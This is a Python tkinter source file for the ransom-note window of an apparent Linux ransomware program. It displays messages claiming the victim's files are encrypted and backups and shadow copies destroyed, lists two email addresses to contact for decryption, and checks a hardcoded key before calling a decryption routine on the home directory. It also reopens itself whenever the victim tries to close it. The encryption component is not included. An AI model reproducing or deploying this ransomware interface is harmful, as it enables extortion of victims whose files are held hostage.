# Importing the necessary modules
import os
import time 
import threading
import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk


# Creating the class
class EncryptionWindow:
    def __init__(self, linuxEncryptor):
        self.root = tk.Tk()
        self.root.title("Files Encrypted")
        self.root.geometry("1080x900")
        self.root.configure(bg='white')

        # Getting the encryption method 
        self.linuxEncryptor = linuxEncryptor

        # Load demo image
        imagePath = os.path.join("gui", "output.jpg")
        self.loadImage(imagePath)

        # Displaying the warning messages
        self.loadWarningLabel("""
            All your files have been encrypted with military-grade encryption. """)

        self.loadWarningLabel("Backups were either encrypted or deleted or backup disk were formatted. ")

        # Displaying more warning messages
        self.loadWarningLabel("""
            Shadow copies also removed, so f8 or any other methods may damage \n the encryption. """)

        # Adding the description input box
        self.descriptionVar = tk.Text(
            self.root, height=2, width=50,
            bg='white', fg='black', wrap=tk.WORD, font=("Arial", 12)
        )
        self.descriptionVar.pack(pady=10)

        # Create label under the input box
        label = tk.Label(
            self.root,
            text="Please enter or paste your encryption key and click 'Submit'.",
            fg='black', bg='white'
        )
        label.pack(pady=5)

        # Add submit button
        enter_button = tk.Button(
            self.root,
            text="Decrypt Files",
            command=self.onEnter,
            width=20, height=2,
            bg='white', fg='black'
        )
        enter_button.pack(pady=10)

        # Adding the context menu
        self.contextMenu = tk.Menu(self.root, tearoff=0)
        self.contextMenu.add_command(label="Copy", command=self.copyText)
        self.contextMenu.add_command(label="Cut", command=self.cutText)
        self.contextMenu.add_command(label="Paste", command=self.pasteText)

        # Bind right-click to text box
        self.descriptionVar.bind("<Button-3>", self.showContextMenu)

        # Example warning/info labels
        self.loadWarningLabel("To info (decrypt your files) get in touch with us at: cmbonu@ymail.com or cboy.chinedu@gmail.com for the next instructions.")

        # Bind the close event to a custom function 
        self.root.protocol("WM_DELETE_WINDOW", self.onClose)

        # Loader label 
        self.loaderLabel = tk.Label(self.root, text="", 
            bg="white", 
            fg="blue", 
            font=("Arial", 16))
        self.loaderLabel.pack(pady=20)

    # Show message box 
    def showMessageBox(self, title, message): 
        # Create a new top level window 
        customMessageBox = tk.Toplevel() 
        customMessageBox.title(title) 

        # Set the size of the custom message box 
        customMessageBox.geometry("400x200")

        # Create a label to display the message 
        messageLabel = tk.Label(customMessageBox, text=message, 
            wraplength=380, justify="center", font=("Arial", 12))
        messageLabel.pack(pady=20)

        # Create an OK button to close the message box 
        okButton = tk.Button(customMessageBox, text="OK", 
            command=customMessageBox.destroy, width=10)
        okButton.pack(pady=10)

        # Center the message box on the screen 
        customMessageBox.transient(self.root) 
        customMessageBox.grab_set() 
        self.root.wait_window(customMessageBox) 

    # Method called when clicking button
    def onEnter(self):
        description = self.descriptionVar.get('1.0', tk.END).strip()
        # messagebox.showinfo("Message Entered", f"You typed:\n\n{description}")

        # Using try except block 
        try: 
            # Calling the decryption function to decrypt the files, but first verify the code given 
            if (int(description) == 12345): 
                # if the key code is correct, execute the block of code below 
                # Navigate to the home directory 
                os.chdir(os.path.expanduser("~"))

                # Showing the user that the files are getting decrypted 
                # messagebox.showinfo("Message Entered", "[INFO]: Files are being decrypted, Click Ok...")
                self.showMessageBox("Alert", """Files are being decrypted. \nClick Ok to Continue...""")

                # Decrypt the files 
                self.linuxEncryptor.decryptFilesInDirectory(os.getcwd())

                # Change to each directory in the current directory and decrypt all the 
                # files found which were encrypted 
                for entry in os.listdir(os.getcwd()): 
                    entryPath = os.path.join(os.getcwd(), entry)

                # Check if the entry is a directory 
                if os.path.isdir(entryPath): 
                    os.chdir(entryPath)

                    # Decrypt the files 
                    self.linuxEncryptor.decryptFilesInDirectory(os.getcwd())

                    # Change directory 
                    os.chdir("..")

                # Displaying the mesage box 
                messagebox.showinfo("Message Entered", "[INFO]: Files Decrypted...")

                # Closing the code 
                exit() 

            else: 
                print("Invalid Key code")
                self.showMessageBox("Alert", "Invalid Key Code...")

        except Exception as error: 
            print("Invalid Code")
            self.showMessageBox("Alert", "Invalid Key Code... ")

    # Custom close function 
    def onClose(self): 
        self.root.withdraw() 
        self.root.after(1000, self.reopen)

    # Reopen the application 
    def reopen(self): 
        self.root.deiconify()

    # Show context menu
    def showContextMenu(self, event):
        self.contextMenu.post(event.x_root, event.y_root)

    # Copy text
    def copyText(self):
        self.root.clipboard_clear()
        self.root.clipboard_append(self.descriptionVar.get('1.0', tk.END).strip())

    # Cut text
    def cutText(self):
        self.copyText()
        self.descriptionVar.delete('1.0', tk.END)

    # Paste text
    def pasteText(self):
        try:
            text = self.root.clipboard_get()
            self.descriptionVar.insert(tk.END, text)
        except tk.TclError:
            pass

    # Load an image safely
    def loadImage(self, imagePath):
        try:
            image = Image.open(imagePath)
            image = image.resize((200, 200), Image.LANCZOS)
            photo = ImageTk.PhotoImage(image)

            imageLabel = tk.Label(self.root, image=photo, bg='white')
            imageLabel.image = photo  # keep reference
            imageLabel.pack(pady=10)

        except FileNotFoundError:
            warning = tk.Label(self.root, text="Image not found.", bg="white", fg="red")
            warning.pack(pady=5)

    # Load an info/warning label
    def loadWarningLabel(self, text):
        warningLabel = tk.Label(
            self.root,
            text=text,
            font=("Arial", 14),
            fg='black',
            bg='white',
            wraplength=1000,
            justify="left"
        )
        warningLabel.pack(pady=5)

    # Launch app
    def loadWindow(self):
        self.root.mainloop()

